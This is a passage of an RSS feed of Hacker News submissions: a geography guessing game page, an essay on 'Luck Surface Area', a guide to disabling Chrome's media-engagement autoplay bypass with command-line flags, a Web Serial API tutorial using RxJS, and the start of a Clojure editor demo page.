        <p><a>Guess!</a>
      </p></div>
    </div>
  </li>
<li id="ycard" onclick="loadVideoWithId('arg')">
    <div>
      
      <div>
        <p>Argentina 🇦🇷</p>
        <p>Explore Beautiful Argentina by walking around different cities within it.</p>
        <p><a>Guess!</a>
      </p></div>
    </div>
  </li>
<!-- </div> -->
</ul>


  <div>
      <div onclick="window.location = 'https://virtualvacation.us/streaks'">

        <h3>Streaks Mode </h3>
        <p>Check out the <b>newly</b> released streaks gamemode. Put your geography skills to the test with <b>Country Streak</b> and <b>Radius Streak</b>.</p>
        <p><a href="https://virtualvacation.us/streaks">Let me play!</a></p><!--         <button type="button" class="btn btn-primary btn-outline-secondary" onclick="document.getElementById('id02').style.display='block'" style="color: #f2f2f2; margin-top: 5px;">
  Time Limit Challenge <i class="fa fa-clock-o" aria-hidden="true" style="margin-left: 5px;"></i></button> -->

      </div>
      
      
    </div>
  <div>
      <div>

        <h3>Challenges </h3>
        <p>Challenge yourself with the <b>No Moving</b> and <b>Time Limit</b> challenges. Click the buttons below to get started.</p>
        <p><a onclick="loadVideoWithId('nmo')">No Moving Challenge</a>
        

      </p></div>
      
      
    </div>
    

<!-- <div class="footer-tag"> -->
<!-- <p style="margin-bottom: -100%;">virutalvacation.us &copy; 2020</p> -->
<!-- </div> -->
</div>
<!--Content ends-->
<!-- <footer>
Hi
</footer> -->

    <!-- <input type="hidden" id="refresh" value="no"> -->
    

<div id="id02">
    <div>
      <header> 
        <span onclick="document.getElementById('id02').style.display='none'">×</span>
        <h3>Time Challenge </h3>
      </header>
      <div>
        <p>Video will stop playing after this many seconds: </p>
        <p>Select the mode you want to play. </p>
<!--         <div class="w3-left">
        <div class="form-check">
  <input class="form-check-input" type="radio" name="exampleRadios" id="exampleRadios1" value="option1" checked>
  <label class="form-check-label" for="exampleRadios1">
    Default radio
  </label>
</div>
        <div class="form-check">
  <input class="form-check-input" type="radio" name="exampleRadios" id="exampleRadios1" value="option2" checked>
  <label class="form-check-label" for="exampleRadios1">
    Default radio
  </label>
</div>
        <div class="form-check">
  <input class="form-check-input" type="radio" name="exampleRadios" id="exampleRadios1" value="option3" checked>
  <label class="form-check-label" for="exampleRadios1">
    Default radio
  </label>
</div>
</div> -->
<!--  <div class="w3-left" style="margin-left: 1em;">
        <div class="form-check">
  <input class="form-check-input" type="radio" name="exampleRadios" id="exampleRadios1" value="option1" checked>
  <label class="form-check-label" for="exampleRadios1">
    Default radio
  </label>
</div>
        <div class="form-check">
  <input class="form-check-input" type="radio" name="exampleRadios" id="exampleRadios1" value="option2" checked>
  <label class="form-check-label" for="exampleRadios1">
    Default radio
  </label>
</div>
        <div class="form-check">
  <input class="form-check-input" type="radio" name="exampleRadios" id="exampleRadios1" value="option3" checked>
  <label class="form-check-label" for="exampleRadios1">
    Default radio
  </label>
</div>
</div> -->
      </div>
      
    </div>
  </div>
<p id="controls-360">
<center><span id="100-decrement">
Loading..
</span></center>
</p>
  <!-- Are you up to the challenge? -->


<div id="annc-bar">
  <center>
<b>Hey<span id="guesser-text"> Guesser</span></b>! 👋 We just released our Streaks Gamemode. <a href="https://virtualvacation.us/streaks">Let's Play!</a>
<span onclick="$('#annc-bar').hide('fast')">×</span>

</center>
</div>
<div id="annc-bar2">
  <center>
<b>Hey! 👋 Like City Guesser? Try the multiplayer version! <a href="https://virtualvacation.us/multiplayer">Play Online!</a>
<span onclick="$('#annc-bar2').hide('fast')">×</span>

</b></center></div><b>






  


  
  


</b></div></div>]]>
            </description>
            <link>https://virtualvacation.us/guess</link>
            <guid isPermaLink="false">hacker-news-small-sites-25968788</guid>
            <pubDate>Sat, 30 Jan 2021 13:15:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Increase Your Luck Surface Area]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25968751">thread link</a>) | @deadcoder0904
<br/>
January 30, 2021 | https://www.codusoperandi.com/posts/increasing-your-luck-surface-area | <a href="https://web.archive.org/web/*/https://www.codusoperandi.com/posts/increasing-your-luck-surface-area">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<td>

			<!--
            <div id="callout">
                Check out my latest project, <a href="http://www.anyfu.com">AnyFu</a>, a site that makes it easy to
                hire proven technology experts for short-term screen-share sessions.
            </div>
			-->





<p>
"Luck Surface Area" is a turn of phrase that popped out my mouth during a discussion
episode of <a href="http://www.techzinglive.com/">TechZing</a> a few months back and
is something I've been meaning to write
about ever since but never got around to actually doing. However, thanks to
<a href="http://page99test.wordpress.com/about/">Lance Jones</a>
who referenced the concept in a recent <a href="http://page99test.wordpress.com/2010/11/07/making-the-front-page-of-hn-without-even-trying/">blog post</a> I have finally been spurred into
action.
</p>
<p>
If there's one thing I've discovered in recent years it's this. The amount of
serendipity that will occur in your life, your Luck Surface Area, is directly
proportional to the degree to which you do something you're passionate about
combined with the total number of people to whom this is effectively communicated.
It's a simple concept, but an extremely powerful one because what it implies is
that you can directly control the amount of luck you receive. In other words,
you make your own luck.
</p>
<p>
Here's how it works. When you pour energy into a passion, you develop an expertise
and an expertise of any kind is valuable. But quite often that value can actually
be magnified by the number people who are made aware of it. The reason is that
when people become aware of your expertise, some percentage of them will take
action to capture that value, but quite often it will be in a way you would never
have predicted. Maybe they'll want to hire you, or partner with you, or invest in
you, or who knows what. But in whatever way it happens, it will be serendipitous.
</p>
<p>
But it's not just the expertise that's important, the very passion that created
the expertise has value in its own right. This is because people want to be excited
about things and passion is infectious. When you do something you're excited about
you will naturally pull others into your orbit. And the more people with whom you
share your passion, the more who will be pulled into your orbit.
</p>
<p>
To satisfy my mathematically oriented brain I've gone one step further and formalized
the concept into the equation L = D * T, where L is luck, D is doing and T is telling.
This demonstrates clearly that the more you do and the more people you tell about it,
the larger your Luck Surface Area will become. And while I like equations, it's the
graphical representation that really brings the concept home.
</p>

<img src="https://www.codusoperandi.com/posts/images/luck-surface-area.png">


            <!--
            <div id="trailer">
                Sign up for the <a href="http://www.appignite.com">Appignite</a> beta,
                a tool that makes it possible to create data-driven web applications in minutes rather than months.
                <div style="margin-top: 8px;">
                And follow me on <a href="https://plus.google.com/116160612483689327039/posts?hl=en">Google+</a> because that's where all the action is.
                </div>
            </div>
			-->

		</td>

		<td>&nbsp;</td>

		<td id="header">

            <img id="picture" src="https://www.codusoperandi.com/images/jason.jpg">

			<p>
				My name is Jason Roberts and I live in Pasadena, CA where I'm a
				serial <a href="https://www.codusoperandi.com/projects">entrepreneur</a>,
                <a href="https://www.codusoperandi.com/consulting">freelance</a> coder,
				and co-host of the tech / startup podcast <a href="https://www.codusoperandi.com/podcast">TechZing</a>.
                <a href="https://www.codusoperandi.com/about">Read more...</a>
			</p>

            

			

            

			<p><a title="Google Analytics Alternative" href="http://getclicky.com/260470">
                    <img alt="Google Analytics Alternative" src="http://static.getclicky.com/media/links/badge.gif">
                </a>
				
				
				
			</p>

		</td>
	</div></div>]]>
            </description>
            <link>https://www.codusoperandi.com/posts/increasing-your-luck-surface-area</link>
            <guid isPermaLink="false">hacker-news-small-sites-25968751</guid>
            <pubDate>Sat, 30 Jan 2021 13:09:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What is up with the Preload List? Porn gets to bypass autoplay?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25968744">thread link</a>) | @hippich
<br/>
January 30, 2021 | https://www.symbolcrash.com/2021/01/24/disable-unmuted-autoplay-in-chrome-version-62-and-above/ | <a href="https://web.archive.org/web/*/https://www.symbolcrash.com/2021/01/24/disable-unmuted-autoplay-in-chrome-version-62-and-above/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>Does it seem like Chrome used to do a better job at NOT automatically playing video?  Having problems with unmuted video or audio automatically playing when you visit certain sites?  Have you gone looking for the old autoplay settings only to discover they’re not in Chrome at all anymore? </p>



<p>You are not alone.  In this post, we will first tell you how to fix it, then if you’re interested, keep reading for details about the changes made in Chrome, why they suck, and how we figured out how to disable them.  That way, when they change things again, you’ll be able to work out how to handle it.  </p>



<h2>The Solution:</h2>



<p>For Windows, right-click on the icon you click on to start Chrome.  If this is on the taskbar on Windows 10, right-click on the taskbar icon, then move up to <em>Google Chrome</em> and right-click on that as well.  Then click on Properties, this will open the <em>Google Chrome Propertie</em>s dialog.</p>



<p>In the <em>Target</em> field, you should see this:</p>



<pre><code><code>"c:\Program Files\Google\Chrome\Application\chrome.exe"</code> </code></pre>



<p>Click to edit the <em>Target</em> field, Ctrl-A to select everything, hit Backspace to delete it all, and paste the following:</p>



<pre><code>"c:\Program Files\Google\Chrome\Application\chrome.exe" --disable-features=PreloadMediaEngagementData,MediaEngagementBypassAutoplayPolicies,RecordMediaEngagementScores,RecordWebAudioEngagement</code></pre>



<p>Click Apply, Click OK, and you’re done.</p>



<p>For Linux/OSX, the solution is the same. Find the icon you’re clicking on to start Chrome, edit the properties, and add the same command line flags after the location of the Chrome binary:</p>



<pre><code>--disable-features=PreloadMediaEngagementData,MediaEngagementBypassAutoplayPolicies,RecordMediaEngagementScores,RecordWebAudioEngagement</code></pre>



<p>That’s it.  Restart Chrome and you should have the old behavior back.  Videos might still autoplay on some sites, but they should always be muted until you click on them. </p>



<p>You make sure that it’s off if the <a href="https://media-engagement/" target="_blank" rel="noreferrer noopener">chrome://media-engagement/</a> link stops working!  Without this fix, that link will show your current Media Engagement settings and what data has been logged.</p>



<h3>What changed?  Why does this fix work?</h3>



<p>Back in version 62 of Chrome, they added a feature they called Media Engagement Index (MEI), which keeps a log of how many times you actually click on video and audio on various sites.  Once you’ve actually clicked on a video on a site a certain number of times, it AUTOMATICALLY DISABLES AUTOPLAY PROTECTIONS for that site.  What’s worse than that, they preload a list of sites that get a free bypass of autoplay protections, which includes many porn sites.  </p>



<p>Deciding that they did such a good job with this feature, they then proceeded to remove the autoplay settings from the interface in the browser. </p>



<p>Kind of shitty behavior.  I guess they never figured that people might want autoplay disabled all the time, even on sites they use frequently or even on the magical list of sites that Google decided get a free pass.  Maybe they were just trying to get more people to accidentally blast the audio from porn sites?  Otherwise I’m not sure why anyone thought this was a good idea.  </p>



<p>Fortunately, you can still disable these features from the command line using the <em>–disable-features</em> flag. </p>



<p>Our recommended fix disables four features, which restore the old autoplay behavior, disable the preloaded bypass list, and completely disable the extra tracking of your media consumption:</p>



<p><strong>PreloadMediaEngagementData </strong>–  Disabling this feature will disable the list of sites that Google has pre-determined should be able to bypass autoplay protections.</p>



<p><strong>MediaEngagementBypassAutoplayPolicies </strong>– Disabling this feature disallows sites that you use regularly to bypass autoplay protections.</p>



<p><strong>RecordMediaEngagementScores </strong>– Disabling this feature turns off the Media Engagement tracking altogether.  </p>



<p><strong>RecordWebAudioEngagement </strong>– Disabling this feature turns off the Media Engagement tracking for web audio.</p>



<p>Try enabling and disabling those features individually if you want to further tune this behavior.</p>



<h3>Don’t Take Our Word For It – Look at the Code!</h3>



<p>You can search the Chromium source code here: <a href="https://source.chromium.org/chromium" target="_blank" rel="noreferrer noopener">https://source.chromium.org/chromium</a></p>



<p>This can show you all the other features you might want to disable or enable from the command line.  For example, searching for one of our flags, <em>PreloadMediaEngagementData</em>, brings us to a file called <a href="https://source.chromium.org/chromium/chromium/src/+/master:media/base/media_switches.cc;l=744?q=PreloadMediaEngagementData%20&amp;ss=chromium" target="_blank" rel="noreferrer noopener">media_switches.cc</a> in the Chrome source.  This is how we found the flags to disable the whole MEI system, and there are many other feature flags in there you might want to play with.</p>



<p>You can also use the Chromium code search to find out how these feature flags are actually used.  Searching again for our flag, we can also see the file <a href="https://source.chromium.org/chromium/chromium/src/+/master:chrome/browser/media/media_engagement_contents_observer.cc;l=594?q=PreloadMediaEngagementData&amp;ss=chromium" target="_blank" rel="noreferrer noopener">media_engagement_contents_observer.cc</a>, which has all of the logic for the MEI features and exactly how and when these flags are used!</p>



<p>If things change in the future, check back on these two files to see if they’ve added more features or logic you need to disable.</p>



<h3>What is up with the Preload List?  Porn gets to bypass autoplay?  Really?</h3>



<p>From the Chromium code search, we searched for <em>PreloadMediaEngagementData</em> and found <a href="https://source.chromium.org/chromium/chromium/src/+/master:chrome/browser/media/media_engagement_contents_observer.cc;l=601?q=PreloadMediaEngagementData&amp;ss=chromium" target="_blank" rel="noreferrer noopener">where it loads the list of sites</a> that get to bypass autoplay.  It’s coming from a protobuf file called preloaded_data.pb which you can find in your Chrome application folder.  On our test machine (version 88), this was at:  </p>



<pre><code>C:\Program Files\Google\Chrome\Application\88.0.4324.104\MEIPreload\preloaded_data.pb </code></pre>



<p>Protobuf is a binary data encoding from Google, so you can’t just read it.  Being lazy, we just searched Github for <em>preloaded_data.pb</em>, and found <a rel="noreferrer noopener" href="https://gist.github.com/NeatMonster/e9cdb01441a3cd842e6a20fd5170f071" target="_blank">this nice Python script </a>, courtesy of <a href="https://github.com/NeatMonster" target="_blank" rel="noreferrer noopener">NeatMonster</a>, to decode this file to plain text (<a rel="noreferrer noopener" href="https://gist.github.com/awgh/fb62a7e880b56d4c1007def320259060" target="_blank">mirror</a>).</p>



<p>Included in that gist is the list of preloaded list of sites that can bypass autoplay, and you can see sites like pornhub and xhamster in there, among a bunch of other questionable sites for this privilege.</p>



<p>But again, don’t take our word for it, you can run this yourself.  Copy your preloaded_data.pb file out of the Chrome folder and into a temporary folder (or Downloads, etc.), save the <em><strong><a href="https://gist.githubusercontent.com/awgh/fb62a7e880b56d4c1007def320259060/raw/ceb21caf0373a58b09ab63d10edbe306657a7766/unpack_dafsa.py" target="_blank" rel="noreferrer noopener">unpack_dafsa.py</a></strong></em> file to the same folder, and run it from the command line (requires Python):</p>



<pre><code>python unpack_dafsa.py</code></pre>



<p>That will spit out the current contents of the autoplay bypass list for your installed version of Chrome. </p>



<p>Not exactly a list of sites you want to have just blast audio without your explicit permission, is it?</p>





                         
<div>
	<p><img alt="" src="https://secure.gravatar.com/avatar/e2760b825a2d8f8c797428c91f7632ce?s=42&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/e2760b825a2d8f8c797428c91f7632ce?s=84&amp;d=mm&amp;r=g 2x" height="42" width="42" loading="lazy">	</p><!-- .author-avatar -->

	<!-- .author-description -->
</div><!-- .author-info -->
	</div></div>]]>
            </description>
            <link>https://www.symbolcrash.com/2021/01/24/disable-unmuted-autoplay-in-chrome-version-62-and-above/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25968744</guid>
            <pubDate>Sat, 30 Jan 2021 13:08:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[India attempting to try to ban Bitcoin and other crypto [pdf] (Page 26/Point 12)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25968711">thread link</a>) | @nwotnagrom
<br/>
January 30, 2021 | http://loksabhadocs.nic.in/bull2mk/2021/29012021.pdf | <a href="https://web.archive.org/web/*/http://loksabhadocs.nic.in/bull2mk/2021/29012021.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>http://loksabhadocs.nic.in/bull2mk/2021/29012021.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-25968711</guid>
            <pubDate>Sat, 30 Jan 2021 13:02:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: League of Legends Build Orders by Genetic Algorithm]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25968564">thread link</a>) | @ReflectedImage
<br/>
January 30, 2021 | https://www.lolsolved.gg/builds/ | <a href="https://web.archive.org/web/*/https://www.lolsolved.gg/builds/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.lolsolved.gg/builds/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25968564</guid>
            <pubDate>Sat, 30 Jan 2021 12:34:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Using the new Web Serial API to build reactive hardware applications]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25968386">thread link</a>) | @tanepiper
<br/>
January 30, 2021 | https://tane.dev/2021/01/web-serial-api-with-rxjs-two-way-reactive-communication-between-browser-and-serial-hardware/ | <a href="https://web.archive.org/web/*/https://tane.dev/2021/01/web-serial-api-with-rxjs-two-way-reactive-communication-between-browser-and-serial-hardware/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><ul>
<li><a href="https://rxjs-from-web-serial.stackblitz.io/" target="_blank">Demo Link</a>
</li>
<li><a href="https://stackblitz.com/edit/rxjs-from-web-serial?file=index.ts" target="_blank">Demo Source</a>
</li>
</ul>
<p>Version 89 of Chrome and Edge browsers have released the <a href="https://reillyeon.github.io/serial/" target="_blank">Web Serial API</a>
 unflagged
which means as user it’s now available for general use rather than being locked behind experimental flags (if you’re
on an earlier version you can enable <strong>Experimental Web Platform features</strong> in <code>chrome://flags</code>)</p>
<p>The API allows for communication between the browser and supported serial hardware such
as <a href="https://www.arduino.cc/" target="_blank">Arduino</a>
 or <a href="https://www.raspberrypi.org/" target="_blank">RaspberryPi</a>
 over USB Serial connection - the
device registers as available to the browser and a port can be opened.</p>
<p>If you don’t have any hardware to connect to, you can easily test it using a Bluetooth Serial connection - provided your
computer has a Bluetooth module you can connect your mobile device to it and use the appropriate software.</p>
<ul>
<li>For Android <a href="https://play.google.com/store/apps/details?id=de.kai_morich.serial_bluetooth_terminal&amp;hl=en&amp;gl=US" target="_blank">Serial Bluetooth Terminal</a>
</li>
<li>For iOS <a href="https://apps.apple.com/us/app/ble-to-serial-terminal/id1238004134" target="_blank">BLE to Serial Terminal</a>
.</li>
</ul>
<h2 id="connecting-browser-to-hardware">Connecting Browser to Hardware</h2>
<p>To request access to a device, a call needs to be made to the newly available function <code>navigator.serial.requestPort</code>:</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span></code></pre></td>
<td>
<pre><code data-lang="ts"><span>const</span> <span>startButton</span> <span>=</span> document.<span>getElementById</span>(<span>"start"</span>);

<span>startButton</span>.<span>addEventListener</span>(<span>"click"</span>, <span>async</span> <span>event</span> <span>=&gt;</span> {
  <span>try</span> {
    <span>const</span> <span>port</span> <span>=</span> <span>await</span> <span>navigator</span>.<span>serial</span>.<span>requestPort</span>();
    <span>// We can now access the serial device by opening it
</span><span></span>    <span>// e.g. await port.open({baudRate: 9600})
</span><span></span>  } <span>catch</span> (<span>e</span>) {
    <span>// The prompt has been dismissed without selecting a device.
</span><span></span>  }
});
</code></pre></td></tr></tbody></table>
</div>
</div><p>This function is part of a set that <strong>must</strong> be called from a specific set of user interactions such as <code>touch</code> or
<code>click</code> events - in the demo
after a user gesture such as a button click - you cannot just call <code>requestPort</code> from your code without some kind of
user interaction as this will cause a security violation. You also must call it from a location that does not have
policy set up to disable this (you can see this in the demo above - if you try run it in the editor it won’t work due to
the <code>&lt;iframe&gt;</code> not having the correct policy).</p>
<p>You may also need to install the <a href="https://www.npmjs.com/package/@types/w3c-web-serial" target="_blank">w3c-web-serial types</a>
 in your
project to make sure you have the available types on the <code>navigator</code> object and global types such as <code>SerialPort</code>.</p>
<p>To get a port, call <code>navigator.serial.requestPort</code> inside the handler - it will return a Promise that contains the port
object - you can also wrap it in a <code>try/catch</code> to handle when the user cancels device selection.</p>
<p>The port object once created must be called with the <code>open</code> method - the only required property of the options is the
<code>baudRate</code> which is the maximum bits-per-second transferred but there
are <a href="https://reillyeon.github.io/serial/#open-method" target="_blank">other options</a>
 based on the requirements of the device.</p>
<p>Once opened the port can return a <a href="https://developer.mozilla.org/en-US/docs/Web/API/ReadableStream" target="_blank">ReadableStream</a>

and <a href="https://developer.mozilla.org/en-US/docs/Web/API/WritableStream" target="_blank">WritableStream</a>
 which allows data to be passed to
and from the device.</p>
<h2 id="our-rxjs-operator">Our RxJS Operator</h2>
<p>To turn this into an RxJS operator we’ll consume the port and set up the functionality to both read and write to the
serial bus. You
can <a href="https://github.com/rxjs-ninja/rxjs-ninja/blob/main/libs/rxjs/utility/src/lib/from-web-serial.ts" target="_blank">read the full source code</a>

to see how the final Observable was created, but we’ll cover the important sections below.</p>
<h2 id="reading-from-the-serial-bus">Reading from the Serial Bus</h2>
<p>Once connected, the serial device can start sending data to us - as it’s a <code>ReadableStream</code> the result will be
a <code>UInt8Array</code>.</p>
<p>Here we’ll set up an iterable reader for our stream - while the result is not <code>done</code> and the port is still readable,
we’ll continue to read the source and emit it to the subscriber of the Observable. If the reader has completed, or the
port has been closed we’ll end this iteration.</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span><span>12
</span><span>13
</span><span>14
</span><span>15
</span></code></pre></td>
<td>
<pre><code data-lang="ts"><span>await</span> <span>port</span>.<span>open</span>({<span>baudRate</span>: <span>9600</span>});

<span>const</span> <span>process</span> <span>=</span> <span>async</span> (
  <span>result</span>: <span>ReadableStreamReadResult</span>&lt;<span>Uint8Array</span>&gt;
)<span>:</span> <span>Promise</span>&lt;<span>ReadableStreamReadResult</span><span>&lt;</span><span>Uint8Array</span>&gt;<span>&gt;</span> <span>=&gt;</span> {
  <span>subscriber</span>.<span>next</span>(<span>result</span>.<span>value</span>);
  <span>return</span> <span>!</span><span>result</span>.<span>done</span> <span>||</span> <span>!</span><span>port</span>.<span>readable</span>
    <span>?</span> <span>reader</span>.<span>read</span>().<span>then</span>(<span>process</span>)
    <span>:</span> <span>Promise</span>.<span>resolve</span>(<span>result</span>);
};

<span>if</span> (<span>port</span>.<span>readable</span>) {
  <span>reader</span> <span>=</span> <span>port</span>.<span>readable</span>.<span>getReader</span>();
  <span>reader</span>.<span>read</span>().<span>then</span>(<span>process</span>);
}
</code></pre></td></tr></tbody></table>
</div>
</div><p>As the output of our Observable is a <code>Uint8Array</code>. Depending on your needs you can decode this to the format you need,
but in most cases it will be text content - here we can use
a <a href="https://developer.mozilla.org/en-US/docs/Web/API/TextDecoder" target="_blank">TextDecoder</a>
 to get the value:</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span><span>5
</span><span>6
</span><span>7
</span><span>8
</span></code></pre></td>
<td>
<pre><code data-lang="ts"><span>const</span> <span>decoder</span> <span>=</span> <span>new</span> <span>TextDecoder</span>(<span>"utf-8"</span>);

<span>fromWebSerial</span>(<span>port</span>).<span>pipe</span>(
  <span>tap</span>(<span>value</span> <span>=&gt;</span> {
    <span>// Value is a UInt8Array, we can append to a element by decoding it
</span><span></span>    <span>outputEl</span>.<span>innerHTML</span> <span>=</span> <span>decoder</span>.<span>decode</span>(<span>value</span>)
  })
).<span>subscribe</span>()
</code></pre></td></tr></tbody></table>
</div>
</div><h2 id="writing-to-the-serial-bus">Writing to the Serial Bus</h2>
<p>The API also allows for writing data to the device, here we can use another <code>Observable</code> that emits a string and provide
it to our function as a source, then we can hook it up to the ports <code>WritableStream</code>.</p>
<p>Instead of directly writing, we will create
a <a href="https://developer.mozilla.org/en-US/docs/Web/API/TransformStream" target="_blank">TextEncoderStream</a>
 - this allows us to create a new
internal writer that we have more control over - it contains both a reader and writer we use this to connect our
sources.</p>
<p>The reader from our encoder will be piped to the ports <code>WritableStream</code>, and the writer passed
to <a href="https://github.com/rxjs-ninja/rxjs-ninja/blob/main/libs/rxjs/utility/src/lib/to-writable-stream.ts" target="_blank">toWritableStream</a>

which connects the <code>Observable</code> to the writer:</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span><span>5
</span><span>6
</span><span>7
</span><span>8
</span></code></pre></td>
<td>
<pre><code data-lang="ts"><span>if</span> (<span>writerSource</span> <span>&amp;&amp;</span> <span>port</span>.<span>writable</span>) {
  <span>const</span> <span>encoder</span> <span>=</span> <span>new</span> <span>TextEncoderStream</span>();
  <span>writerEnd</span> <span>=</span> <span>encoder</span>.<span>readable</span>.<span>pipeTo</span>(<span>port</span>.<span>writable</span>);
  <span>const</span> <span>outputStream</span> <span>=</span> <span>encoder</span>.<span>writable</span>;

  <span>writer</span> <span>=</span> <span>outputStream</span>.<span>getWriter</span>();
  <span>writerSource</span>.<span>pipe</span>(<span>toWritableStream</span>(<span>writer</span>, <span>signal</span>)).<span>subscribe</span>();
}
</code></pre></td></tr></tbody></table>
</div>
</div><p>Now we can pass the <code>Observable</code> and use it to emit our values:</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span><span>5
</span></code></pre></td>
<td>
<pre><code data-lang="ts"><span>const</span> <span>emitter$</span> <span>=</span> <span>new</span> <span>Subject</span>&lt;<span>string</span>&gt;();

<span>fromWebSerial</span>(<span>port</span>, <span>emitter$</span>.<span>asObservable</span>()).<span>subscribe</span>();

<span>emitter$</span>.<span>next</span>(<span>'Hello There!'</span>);
</code></pre></td></tr></tbody></table>
</div>
</div><h2 id="creating-a-serial-chat-app">Creating a Serial Chat App</h2>
<p>Now we can read from, and write to, our hardware device
the <a href="https://github.com/svendahlstrand/web-serial-api" target="_blank">possibilities are endless</a>
 with what we can do - provided the
hardware supports it.</p>
<p>For this tutorial I build a <a href="https://rxjs-from-web-serial.stackblitz.io/" target="_blank">very basic chat app</a>
 - using the Bluetooth
Serial applications mentioned above you can use it to send and receive text data between devices.</p>
<p><img src="https://tane.dev/images/web-serial-mobile.jpg" alt="A screenshot of a web serial mobile app">
<img src="https://tane.dev/images/web-serial-browser.png" alt="A screenshot of a web serial browser app"></p>
<p>In the <a href="https://stackblitz.com/edit/rxjs-from-web-serial?file=index.ts" target="_blank">example code</a>
 I’ve set up a button to enable
our port request - you should see a popup with a list of devices available for you to use. After connecting
a basic chat interface will show up - type in some text and check out your device software - you should see the same
message there, and you can then send a message back to the browser.</p>
<p>Hopefully you’ve found this tutorial useful and if you do build something with this I’d love to hear about it!</p>
<h2 id="a-collection-of-pre-built-operators-and-observables-for-your-projects">A collection of pre-built operators and Observables for your projects</h2>
<p><img src="https://raw.githubusercontent.com/rxjs-ninja/rxjs-ninja/main/assets/logo.png" alt="The RxJS Logo, a Ninja jumping over a moon"></p>
<p><a href="https://rxjs.ninja/" target="_blank">RxJS Ninja</a>
 - is a collection of over 130 operators for working with various types of data (such
as <a href="https://rxjs.ninja/modules/array.html" target="_blank">arrays</a>
, <a href="https://rxjs.ninja/modules/number.html" target="_blank">numbers</a>
) and
<a href="https://rxjs.ninja/modules/utility.html#Streams" target="_blank">streams</a>
 allowing for modifying, filtering and querying the data.</p>
<p>Still in active development, you might find useful operators that provide clearer intent for your RxJS code.</p>
<p>You can check out the source code on <a href="https://github.com/rxjs-ninja/rxjs-ninja" target="_blank">GitHub</a>
.</p>
</div></div>]]>
            </description>
            <link>https://tane.dev/2021/01/web-serial-api-with-rxjs-two-way-reactive-communication-between-browser-and-serial-hardware/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25968386</guid>
            <pubDate>Sat, 30 Jan 2021 11:58:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Clojure/Script mode for CodeMirror 6]]>
            </title>
            <description>
<![CDATA[
Score 34 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25968289">thread link</a>) | @tosh
<br/>
January 30, 2021 | https://nextjournal.github.io/clojure-mode/ | <a href="https://web.archive.org/web/*/https://nextjournal.github.io/clojure-mode/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <h2 id="try-it">
        <a href="#try-it">🤹‍♀️ Try it for yourself</a>
      </h2>
      <div>
        <div>
          <h3>Try evaluating any of these forms with <span>Alt</span> <span>+</span> <span>⏎</span> !</h3>
          <p>
            In-browser eval is powered by <a href="https://github.com/borkdude/sci">Sci</a>.
          </p>
          
        </div>
        <div>
          <ul>
            <li>
              <span>⚡️</span>
              <div>
                <p><span>Lightning-fast</span> with <a href="https://lezer.codemirror.net/">lezer incremental parsing</a><br>
                <span>
                  Copy <a href="https://raw.githubusercontent.com/clojure/clojure/master/src/clj/clojure/core.clj" target="_blank"><code>clojure/core.clj</code></a> into 👈 <span>to try!</span>
                </span>
              </p></div>
            </li>
            <li>
              <span>🥤</span>
              <div>
                <p><span>Slurping &amp; 🤮 Barfing</span></p><table>
                  <tbody>
                    <tr>
                      <td>forward</td>
                      <td>
                        <span>Ctrl</span> + <span>←</span> / <span>→</span>
                      </td>
                      <td>
                        <span>or</span> <span>Mod</span> + <span>⇧</span> + <span>j</span> / <span>k</span>
                      </td>
                    </tr>
                    <tr>
                      <td>backward</td>
                      <td>
                        <span>Ctrl</span> + <span>Alt</span> + <span>←</span> / <span>→</span>
                      </td>
                      <td></td>
                    </tr>
                  </tbody>
                </table>
              </div>
            </li>
            <li>
              <span>💗</span>
              <div>
                <p><span>Semantic Selections</span></p><table>
                  <tbody>
                    <tr>
                      <td>Expand / Contract</td>
                      <td>
                        <span>Alt</span> + <span>↑</span> / <span>↓</span>
                      </td>
                      <td>
                        <span>or</span> <span>Mod</span> + <span>1</span> / <span>2</span>
                      </td>
                    </tr>
                  </tbody>
                </table>
              </div>
            </li>
            <li>
              <span>🧙</span>
              <div>
                <p><span>Evaluation</span></p><table>
                  <tbody>
                    <tr>
                      <td>
                        At Cursor
                      </td>
                      <td>
